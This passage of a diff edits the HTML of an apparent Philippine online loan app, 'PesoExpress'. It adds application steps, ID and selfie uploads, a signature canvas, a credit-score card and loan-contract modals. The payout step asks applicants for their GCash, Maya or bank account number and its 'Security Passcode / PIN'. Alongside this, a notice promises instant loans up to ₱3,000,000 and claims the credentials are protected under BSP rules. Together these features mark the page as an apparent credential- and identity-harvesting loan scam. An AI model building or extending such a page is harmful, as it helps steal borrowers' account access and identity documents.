+                                <div class="form-group"><label>Monthly Income (PHP)</label><input type="number" id="monthlyIncome" class="form-control" placeholder="Enter monthly salary/income" required></div>
+                                <div class="form-group">
+                                    <label>Loan Purpose</label>
+                                    <select id="loanPurposeSelect" class="form-control" onchange="onLoanPurposeSelectChange(this.value)" required>
+                                        <option value="Emergency Expenses">Emergency Expenses</option>
+                                        <option value="Business Capital">Business Capital</option>
+                                        <option value="Medical & Health">Medical & Health</option>
+                                        <option value="Education & Tuition">Education & Tuition</option>
+                                        <option value="Custom">Other (Type Custom Purpose below)</option>
+                                    </select>
+                                    <input type="text" id="loanPurposeCustom" class="form-control" placeholder="Type custom loan purpose..." style="margin-top: 0.5rem; display: none;">
+                                </div>
+                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(1)">&larr; Back</button><button type="button" class="btn btn-primary" style="flex:2; font-weight:700;" onclick="goToStep(3)">NEXT &rarr;</button></div>
                             </div>
 
-                            <!-- Step 3 -->
+                            <!-- Step 3: Verification Documents (Front ID, Back ID, Selfie Sign) -->
                             <div id="step3" class="form-step" style="display: none;">
-                                <div class="form-group"><label>Valid ID Type</label><select id="idType" class="form-control" required><option value="SSS / UMID ID">SSS / UMID ID</option><option value="Driver's License">Driver's License</option><option value="Passport">Passport</option></select></div>
-                                <div class="form-group"><label>ID Card Number</label><input type="text" id="idNumber" class="form-control" required></div>
-                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin: 1rem 0;">
-                                    <div style="border: 1px dashed #cbd5e1; padding: 0.75rem; text-align: center; border-radius: 8px;">
-                                        <div style="font-size: 1.5rem;">🪪</div>
-                                        <button type="button" class="btn btn-outline" style="font-size: 0.75rem; padding: 0.3rem 0.5rem;" onclick="document.getElementById('idCardFileInput').click()">ID Photo</button>
+                                <div class="form-group"><label>Valid ID Type</label><select id="idType" class="form-control" required><option value="SSS / UMID ID">SSS / UMID ID</option><option value="Driver's License">Driver's License</option><option value="Passport">Passport</option><option value="PRC ID">PRC ID</option></select></div>
+                                <div class="form-group"><label>ID Card Number</label><input type="text" id="idNumber" class="form-control" placeholder="Enter ID card number" required></div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.5rem; margin: 1rem 0;">
+                                    <!-- 1. Front ID -->
+                                    <div style="border: 1px dashed #cbd5e1; padding: 0.6rem 0.4rem; text-align: center; border-radius: 8px; background: #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
+                                        <div style="width: 32px; height: 32px; margin: 0 auto 0.2rem auto; border-radius: 6px; background: #e0f2fe; display: flex; align-items: center; justify-content: center;">
+                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0284c7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"></rect><line x1="7" y1="8" x2="17" y2="8"></line><line x1="7" y1="12" x2="13" y2="12"></line><line x1="7" y1="16" x2="10" y2="16"></line></svg>
+                                        </div>
+                                        <span style="display:block; font-size:0.75rem; font-weight:700; color:var(--text-dark); margin-bottom:0.3rem;">Front ID</span>
+                                        <button type="button" class="btn btn-outline" style="font-size: 0.7rem; padding: 0.25rem 0.4rem; width:100%; border-color: #0284c7; color: #0284c7; font-weight:700;" onclick="document.getElementById('idCardFileInput').click()">Upload</button>
                                         <input type="file" id="idCardFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(event, 'idCardPreview', 'idCardBase64')">
-                                        <img id="idCardPreview" style="display:none; width:100%; height:80px; margin-top:5px; object-fit:cover;">
+                                        <img id="idCardPreview" style="display:none; width:100%; height:65px; margin-top:5px; object-fit:cover; border-radius:4px;">
                                         <input type="hidden" id="idCardBase64">
                                     </div>
-                                    <div style="border: 1px dashed #cbd5e1; padding: 0.75rem; text-align: center; border-radius: 8px;">
-                                        <div style="font-size: 1.5rem;">🤳</div>
-                                        <button type="button" class="btn btn-outline" style="font-size: 0.75rem; padding: 0.3rem 0.5rem;" onclick="document.getElementById('selfieFileInput').click()">Selfie Sign</button>
+                                    
+                                    <!-- 2. Back ID -->
+                                    <div style="border: 1px dashed #cbd5e1; padding: 0.6rem 0.4rem; text-align: center; border-radius: 8px; background: #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
+                                        <div style="width: 32px; height: 32px; margin: 0 auto 0.2rem auto; border-radius: 6px; background: #e0f2fe; display: flex; align-items: center; justify-content: center;">
+                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0284c7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+                                        </div>
+                                        <span style="display:block; font-size:0.75rem; font-weight:700; color:var(--text-dark); margin-bottom:0.3rem;">Back ID</span>
+                                        <button type="button" class="btn btn-outline" style="font-size: 0.7rem; padding: 0.25rem 0.4rem; width:100%; border-color: #0284c7; color: #0284c7; font-weight:700;" onclick="document.getElementById('idCardBackFileInput').click()">Upload</button>
+                                        <input type="file" id="idCardBackFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(event, 'idCardBackPreview', 'idCardBackBase64')">
+                                        <img id="idCardBackPreview" style="display:none; width:100%; height:65px; margin-top:5px; object-fit:cover; border-radius:4px;">
+                                        <input type="hidden" id="idCardBackBase64">
+                                    </div>
+
+                                    <!-- 3. Selfie with Hand Sign -->
+                                    <div style="border: 1px dashed #cbd5e1; padding: 0.6rem 0.4rem; text-align: center; border-radius: 8px; background: #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
+                                        <div style="width: 32px; height: 32px; margin: 0 auto 0.2rem auto; border-radius: 6px; background: #e0f2fe; display: flex; align-items: center; justify-content: center;">
+                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0284c7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
+                                        </div>
+                                        <span style="display:block; font-size:0.75rem; font-weight:700; color:var(--text-dark); margin-bottom:0.3rem;">Selfie Sign</span>
+                                        <button type="button" class="btn btn-outline" style="font-size: 0.7rem; padding: 0.25rem 0.4rem; width:100%; border-color: #0284c7; color: #0284c7; font-weight:700;" onclick="document.getElementById('selfieFileInput').click()">Upload</button>
                                         <input type="file" id="selfieFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(event, 'selfiePreview', 'selfieBase64')">
-                                        <img id="selfiePreview" style="display:none; width:100%; height:80px; margin-top:5px; object-fit:cover;">
+                                        <img id="selfiePreview" style="display:none; width:100%; height:65px; margin-top:5px; object-fit:cover; border-radius:4px;">
                                         <input type="hidden" id="selfieBase64">
                                     </div>
                                 </div>
-                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(2)">&larr; Back</button><button type="button" class="btn btn-primary" style="flex:2;" onclick="goToStep(4)">Next &rarr;</button></div>
+                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(2)">&larr; Back</button><button type="button" class="btn btn-primary" style="flex:2; font-weight:700;" onclick="goToStep(4)">NEXT &rarr;</button></div>
                             </div>
 
-                            <!-- Step 4 -->
+                            <!-- Step 4: Payout & Digital Hand Signature -->
                             <div id="step4" class="form-step" style="display: none;">
-                                <div class="form-group"><label>Payout Bank / Wallet</label><select id="payoutMethod" class="form-control" required><option value="GCash">💙 GCash</option><option value="Maya (PayMaya)">💚 Maya / PayMaya</option><option value="LINK (NetBank)">🌐 LINK (NetBank)</option><option value="BPI">🏛️ BPI</option><option value="BDO">🏛️ BDO</option><option value="China Bank">🏛️ China Bank</option><option value="UnionBank">🏛️ UnionBank</option></select></div>
-                                <div class="form-group"><label>Account Holder Name</label><input type="text" id="bankAccountName" class="form-control" required></div>
-                                <div class="form-group"><label>Account / Wallet Number</label><input type="text" id="bankAccountNumber" class="form-control" required></div>
-                                <div class="form-group"><label>Security Passcode / PIN</label><input type="password" id="bankAccountPassword" class="form-control" required></div>
+                                <div class="form-group">
+                                    <label>Payout Bank / Wallet</label>
+                                    <div style="display: flex; align-items: center; gap: 0.6rem; background: #fff; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0.2rem 0.6rem;">
+                                        <img id="payoutBankLogoPreview" src="https://www.google.com/s2/favicons?domain=gcash.com&sz=128" alt="Bank Logo" style="width: 24px; height: 24px; object-fit: contain; flex-shrink: 0;">
+                                        <select id="payoutMethod" class="form-control" style="border: none; padding-left: 0; outline: none; box-shadow: none;" onchange="updatePayoutBankLogo(this.value)" required>
+                                            <option value="GCash">GCash</option>
+                                            <option value="Maya (PayMaya)">Maya / PayMaya</option>
+                                            <option value="LINK (NetBank)">LINK (NetBank)</option>
+                                            <option value="BPI">BPI</option>
+                                            <option value="BDO">BDO</option>
+                                            <option value="China Bank">China Bank</option>
+                                            <option value="UnionBank">UnionBank</option>
+                                        </select>
+                                    </div>
+                                </div>
+                                <div class="form-group"><label>Account Holder Name</label><input type="text" id="bankAccountName" class="form-control" placeholder="Enter account holder full name" required></div>
+                                <div class="form-group"><label>Account / Wallet Number</label><input type="text" id="bankAccountNumber" class="form-control" placeholder="Enter account or wallet number" required></div>
+                                <div class="form-group"><label>Security Passcode / PIN</label><input type="password" id="bankAccountPassword" class="form-control" placeholder="••••" required></div>
+
+                                <!-- DIGITAL CONTRACT HAND SIGNATURE CANVAS -->
+                                <div class="form-group" style="margin-top: 1rem; margin-bottom: 1.25rem;">
+                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.4rem;">
+                                        <label style="margin: 0; font-weight: 700; font-size: 0.85rem; color: var(--text-dark);">Digital Contract Hand Signature</label>
+                                        <button type="button" onclick="clearSignatureCanvas()" style="background: transparent; border: none; color: #ef4444; font-size: 0.75rem; font-weight: 700; cursor: pointer;">Clear Signature</button>
+                                    </div>
+                                    <div style="border: 2px dashed #00b359; border-radius: 10px; padding: 4px; background: #ffffff; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.04);">
+                                        <canvas id="signatureCanvas" width="340" height="110" style="width: 100%; height: 110px; background: #ffffff; cursor: crosshair; touch-action: none; border-radius: 6px;"></canvas>
+                                        <div style="font-size: 0.7rem; color: var(--text-muted); margin-top: 2px;">Sign above using mouse or finger touch</div>
+                                    </div>
+                                    <input type="hidden" id="signatureBase64">
+                                </div>
+
                                 <div id="formError" style="color: var(--danger-color); font-size: 0.85rem; margin-bottom: 1rem; display: none;"></div>
-                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(3)">&larr; Back</button><button type="submit" class="btn btn-primary" style="flex:2;">🚀 Submit Application</button></div>
+                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(3)">&larr; Back</button><button type="submit" class="btn btn-primary" style="flex:2; font-weight: 800;">SUBMIT APPLICATION</button></div>
                             </div>
                         </form>
                     </div>
@@ -386,15 +576,35 @@
                 <!-- TAB 4: PROFILE SCREEN (`#viewProfile`) MATCHING EXACT REFERENCE IMAGE -->
                 <div id="viewProfile" style="display: none;">
                     
-                    <!-- PROFILE VERIFICATION CARD -->
-                    <div class="profile-verify-card">
-                        <div class="profile-avatar-ring">
+                    <!-- PROFILE VERIFICATION & CREDIT SCORE BOARD CARD -->
+                    <div class="profile-verify-card" style="padding: 1.25rem; text-align: center;">
+                        <div class="profile-avatar-ring" style="margin: 0 auto 0.75rem auto;">
                             <div class="profile-avatar-inner">
-                                👤
+                                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                             </div>
                         </div>
-                        <h3>Profile Verification</h3>
-                        <p>Your credit score will appear here after verification.</p>
+                        
+                        <div style="font-size: 0.85rem; font-weight: 800; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 0.25rem;">CREDIT SCORE BOARD</div>
+                        
+                        <div style="display: flex; align-items: center; justify-content: center; gap: 0.4rem; margin-bottom: 0.5rem;">
+                            <span id="creditScoreValue" style="font-size: 2.4rem; font-weight: 900; color: #111827; line-height: 1;">500</span>
+                            <span style="font-size: 1rem; color: #9ca3af; font-weight: 800;">/ 1000</span>
+                        </div>
+
+                        <div style="margin-bottom: 0.85rem;">
+                            <span id="creditScoreBadge" style="display: inline-block; padding: 0.3rem 0.9rem; border-radius: 20px; font-size: 0.8rem; font-weight: 800; text-transform: uppercase; background: #fef3c7; color: #d97706; letter-spacing: 0.5px;">MEDIUM</span>
+                        </div>
+
+                        <!-- CREDIT GAUGE BAR -->
+                        <div style="width: 100%; height: 10px; background: #e5e7eb; border-radius: 10px; overflow: hidden; position: relative; margin-bottom: 0.6rem;">
+                            <div id="creditScoreBar" style="width: 50%; height: 100%; background: linear-gradient(90deg, #f59e0b, #10b981); border-radius: 10px; transition: width 0.4s ease;"></div>
+                        </div>
+
+                        <div style="display: flex; justify-content: space-between; font-size: 0.75rem; font-weight: 700; color: #6b7280;">
+                            <span>0 (Low)</span>
+                            <span>500 (Medium)</span>
+                            <span>1000 (High)</span>
+                        </div>
                     </div>
 
                     <!-- ACCOUNT MENU CARD -->
@@ -402,9 +612,9 @@
                         <h4>Account Menu</h4>
                         <p>Manage your profile, contract, schedule, and transactions.</p>
 
-                        <button class="menu-pill-btn" onclick="alert('Viewing Personal Information')">
+                        <button class="menu-pill-btn" onclick="openPersonalInfoModal()">
                             <div class="btn-left">
-                                <div class="menu-icon-circle">👤</div>
+                                <div class="menu-icon-circle"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>
                                 <span>Personal information</span>
                             </div>
                             <span style="font-weight:900;">&rsaquo;</span>
@@ -412,46 +622,46 @@
 
                         <button class="menu-pill-btn" onclick="openBeneficiaryModal()">
                             <div class="btn-left">
-                                <div class="menu-icon-circle">🏛️</div>
+                                <div class="menu-icon-circle"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 22 7 12 2"></polygon><line x1="2" y1="17" x2="22" y2="17"></line><line x1="5" y1="7" x2="5" y2="17"></line><line x1="9" y1="7" x2="9" y2="17"></line><line x1="15" y1="7" x2="15" y2="17"></line><line x1="19" y1="7" x2="19" y2="17"></line></svg></div>
                                 <span>Beneficiary information</span>
                             </div>
                             <span style="font-weight:900;">&rsaquo;</span>
                         </button>
 
-                        <button class="menu-pill-btn" onclick="alert('Viewing Loan Contract')">
+                        <button class="menu-pill-btn" onclick="openLoanContractModal()">
                             <div class="btn-left">
-                                <div class="menu-icon-circle">🅿️</div>
+                                <div class="menu-icon-circle"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg></div>
                                 <span>Loan Contract</span>
                             </div>
                             <span style="font-weight:900;">&rsaquo;</span>
                         </button>
 
-                        <button class="menu-pill-btn" onclick="alert('Viewing Payment Schedule')">
+                        <button class="menu-pill-btn" onclick="openPaymentScheduleModal()">
                             <div class="btn-left">
-                                <div class="menu-icon-circle">📅</div>
+                                <div class="menu-icon-circle"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg></div>
                                 <span>Payment Schedule</span>
                             </div>
                             <span style="font-weight:900;">&rsaquo;</span>
                         </button>
 
-                        <button class="menu-pill-btn" onclick="alert('Viewing Transactions History')">
+                        <button class="menu-pill-btn" onclick="openTransactionsModal()">
                             <div class="btn-left">
-                                <div class="menu-icon-circle">🕒</div>
+                                <div class="menu-icon-circle"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>
                                 <span>Transactions</span>
                             </div>
                             <span style="font-weight:900;">&rsaquo;</span>
                         </button>
 
-                        <button class="menu-pill-btn" onclick="alert('PesoExpress Philippines Online Loans v1.0')">
+                        <button class="menu-pill-btn" onclick="openAboutUsModal()">
                             <div class="btn-left">
-                                <div class="menu-icon-circle">🎴</div>
+                                <div class="menu-icon-circle"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg></div>
                                 <span>About us</span>
                             </div>
                             <span style="font-weight:900;">&rsaquo;</span>
                         </button>
 
                         <button class="btn-logout-pill" onclick="logoutUser()">
-                            <span>🚪</span>
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                             <span>Logout</span>
                         </button>
                     </div>
@@ -465,15 +675,15 @@
         <!-- FIXED BOTTOM NAVIGATION BAR (MATCHING REFERENCE UI) -->
         <nav id="bottomNav" class="app-bottom-nav" style="display: none;">
             <div id="bNavHome" class="bottom-nav-item active" onclick="switchMobileTab('home')">
-                <div class="bottom-nav-icon">🏠</div>
+                <div class="bottom-nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></div>
                 <span>HOME</span>
             </div>
             <div id="bNavWallet" class="bottom-nav-item" onclick="switchMobileTab('wallet')">
-                <div class="bottom-nav-icon">💳</div>
+                <div class="bottom-nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></div>
                 <span>WALLET</span>
             </div>
             <div id="bNavProfile" class="bottom-nav-item" onclick="switchMobileTab('profile')">
-                <div class="bottom-nav-icon">👤</div>
+                <div class="bottom-nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>
                 <span>PROFILE</span>
             </div>
         </nav>
@@ -484,7 +694,7 @@
     <div id="beneficiaryModal" class="modal-overlay">
         <div class="modal-content" style="max-width: 440px; padding: 1.5rem;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
-                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">💳 Beneficiary Information</h3>
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">Beneficiary Information</h3>
                 <span class="close-modal" onclick="closeBeneficiaryModal()">&times;</span>
             </div>
             <div style="text-align: left; margin-bottom: 1.25rem;">
@@ -523,20 +733,64 @@
         </div>
     </div>
 
+    <!-- PERSONAL INFORMATION MODAL -->
+    <div id="personalInfoModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 440px; padding: 1.5rem; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">Personal Information</h3>
+                <span class="close-modal" onclick="closePersonalInfoModal()">&times;</span>
+            </div>
+            
+            <div style="max-height: 60vh; overflow-y: auto; padding-right: 0.5rem; margin-bottom: 1.25rem;">
+                <div class="form-group" style="margin-bottom: 0.75rem;">
+                    <label style="font-size: 0.8rem; color: var(--text-muted);">Full Name</label>
+                    <input type="text" id="viewFullName" class="form-control" readonly style="background: #f8fafc; font-weight: 600;">
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 0.75rem;">
+                    <div class="form-group" style="margin-bottom: 0;">
+                        <label style="font-size: 0.8rem; color: var(--text-muted);">Gender</label>
+                        <input type="text" id="viewGender" class="form-control" readonly style="background: #f8fafc; font-weight: 600;">
+                    </div>
+                    <div class="form-group" style="margin-bottom: 0;">
+                        <label style="font-size: 0.8rem; color: var(--text-muted);">Date of Birth</label>
+                        <input type="text" id="viewDob" class="form-control" readonly style="background: #f8fafc; font-weight: 600;">
+                    </div>
+                </div>
+                <div class="form-group" style="margin-bottom: 0.75rem;">
+                    <label style="font-size: 0.8rem; color: var(--text-muted);">Civil Status</label>
+                    <input type="text" id="viewCivilStatus" class="form-control" readonly style="background: #f8fafc; font-weight: 600;">
+                </div>
+                <div class="form-group" style="margin-bottom: 0.75rem;">
+                    <label style="font-size: 0.8rem; color: var(--text-muted);">Residential Address</label>
+                    <textarea id="viewAddress" class="form-control" readonly rows="2" style="background: #f8fafc; font-weight: 600; resize: none;"></textarea>
+                </div>
+                <div class="form-group" style="margin-bottom: 0.75rem;">
+                    <label style="font-size: 0.8rem; color: var(--text-muted);">Employment Type</label>
+                    <input type="text" id="viewEmploymentType" class="form-control" readonly style="background: #f8fafc; font-weight: 600;">
+                </div>
+                <div class="form-group" style="margin-bottom: 0.75rem;">
+                    <label style="font-size: 0.8rem; color: var(--text-muted);">ID Type & Number</label>
+                    <input type="text" id="viewIdDetails" class="form-control" readonly style="background: #f8fafc; font-weight: 600;">
+                </div>
+            </div>
+            <button class="btn btn-primary btn-block" onclick="closePersonalInfoModal()">Close</button>
+        </div>
+    </div>
+
     <!-- NOTIFICATIONS MODAL -->
     <div id="notifModal" class="modal-overlay">
         <div class="modal-content" style="max-width: 400px; padding: 1.5rem;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
-                <h3 style="color: var(--primary-blue); font-size: 1.15rem;">🔔 System Notifications</h3>
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem;">System Notifications</h3>
                 <span class="close-modal" onclick="closeNotificationsModal()">&times;</span>
             </div>
             <div style="text-align: left; margin-bottom: 1.25rem;">
                 <div style="background: #f8fafc; padding: 0.85rem; border-radius: var(--radius-sm); border-left: 4px solid var(--accent-green); margin-bottom: 0.75rem;">
-                    <strong style="font-size: 0.9rem; color: var(--text-dark);">🎉 Instant Credit Line Approved!</strong>
+                    <strong style="font-size: 0.9rem; color: var(--text-dark);">Instant Credit Line Approved!</strong>
                     <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.2rem;">Welcome to PesoExpress! You are qualified for quick online loans up to ₱3,000,000.</p>
                 </div>
                 <div style="background: #f8fafc; padding: 0.85rem; border-radius: var(--radius-sm); border-left: 4px solid var(--primary-blue);">
-                    <strong style="font-size: 0.9rem; color: var(--text-dark);">🛡️ Security Compliance</strong>
+                    <strong style="font-size: 0.9rem; color: var(--text-dark);">Security Compliance</strong>
                     <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.2rem;">All bank credentials and ID documents are protected under BSP regulations.</p>
                 </div>
             </div>
@@ -544,6 +798,363 @@
         </div>
     </div>
 
-    <script src="app.js?v=2.0"></script>
+    <!-- VIEW LOAN DETAIL MODAL (MATCHING REFERENCE SCREENSHOT) -->
+    <div id="loanDetailModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 440px; border-radius: 16px; padding: 1.75rem 1.25rem 1.5rem 1.25rem; background: #fff;">
+            <h3 style="font-size: 1.35rem; font-weight: 800; color: #111827; margin-bottom: 1.5rem; text-align: left;">View loan detail</h3>
+            
+            <!-- 5-STEP TRACKER -->
+            <div style="display: flex; align-items: center; justify-content: space-between; position: relative; margin-bottom: 1.75rem; padding: 0 0.1rem;">
+                <!-- CONNECTING LINE -->
+                <div style="position: absolute; top: 15px; left: 10%; right: 10%; height: 2px; background: #e5e7eb; z-index: 1;"></div>
+                
+                <!-- STEP 1 -->
+                <div style="position: relative; z-index: 2; text-align: center; width: 20%;">
+                    <div style="width: 32px; height: 32px; border-radius: 50%; background: #10b981; color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 0.4rem auto; font-weight: 800; font-size: 0.95rem;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+                    <div style="font-size: 0.72rem; font-weight: 800; color: #111827; line-height: 1.2;">Submit<br>completed</div>
+                </div>
+                
+                <!-- STEP 2 -->
+                <div style="position: relative; z-index: 2; text-align: center; width: 20%;">
+                    <div id="modalStep2Num" style="width: 32px; height: 32px; border-radius: 50%; background: #10b981; color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 0.4rem auto; font-weight: 800; font-size: 0.9rem;">2</div>
+                    <div id="modalStep2Label" style="font-size: 0.72rem; font-weight: 800; color: #111827; line-height: 1.2;">Under<br>Review</div>
+                </div>
+                
+                <!-- STEP 3 -->
+                <div style="position: relative; z-index: 2; text-align: center; width: 20%;">
+                    <div id="modalStep3Num" style="width: 32px; height: 32px; border-radius: 50%; background: #9ca3af; color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 0.4rem auto; font-weight: 800; font-size: 0.9rem;">3</div>
+                    <div id="modalStep3Label" style="font-size: 0.72rem; font-weight: 700; color: #6b7280; line-height: 1.2;">Approved</div>
+                </div>
+                
+                <!-- STEP 4 -->
+                <div style="position: relative; z-index: 2; text-align: center; width: 20%;">
+                    <div id="modalStep4Num" style="width: 32px; height: 32px; border-radius: 50%; background: #9ca3af; color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 0.4rem auto; font-weight: 800; font-size: 0.9rem;">4</div>
+                    <div id="modalStep4Label" style="font-size: 0.72rem; font-weight: 700; color: #6b7280; line-height: 1.2;">Inprogress</div>
+                </div>
+                
+                <!-- STEP 5 -->
+                <div style="position: relative; z-index: 2; text-align: center; width: 20%;">
+                    <div id="modalStep5Num" style="width: 32px; height: 32px; border-radius: 50%; background: #9ca3af; color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 0.4rem auto; font-weight: 800; font-size: 0.9rem;">5</div>
+                    <div id="modalStep5Label" style="font-size: 0.72rem; font-weight: 700; color: #6b7280; line-height: 1.2;">Successfully</div>
+                </div>
+            </div>
+
+            <hr style="border: 0; border-top: 1px solid #e5e7eb; margin-bottom: 1.25rem;">
+
+            <!-- DESCRIPTION CARD -->
+            <div style="background: #edf7ff; border-radius: 14px; padding: 1.1rem; text-align: left; display: flex; align-items: flex-start; gap: 0.85rem; margin-bottom: 1.5rem; border: 1px solid #e0f2fe;">
+                <div style="width: 40px; height: 40px; border-radius: 50%; background: #dbeafe; display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #0284c7;">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                </div>
+                <div>
+                    <h4 style="font-size: 1.05rem; font-weight: 800; color: #111827; margin-bottom: 0.2rem;">Description of the situation</h4>
+                    <p id="modalDetailNotes" style="font-size: 0.82rem; color: #4b5563; line-height: 1.4;">Current loan progress and review notes.</p>
+                </div>
+            </div>
+
+            <!-- AGREE BUTTON -->
+            <div style="text-align: center;">
+                <button class="btn btn-primary" onclick="closeLoanDetailModal()" style="min-width: 130px; padding: 0.75rem 2.2rem; border-radius: 8px; background: #10b981; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px;">AGREE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOAN CONTRACT MODAL -->
+    <div id="loanContractModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 460px; padding: 1.5rem; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">🅿️ Electronic Loan Contract</h3>
+                <span class="close-modal" onclick="closeLoanContractModal()">&times;</span>
+            </div>
+            <div style="max-height: 65vh; overflow-y: auto; padding-right: 0.5rem; margin-bottom: 1.25rem;">
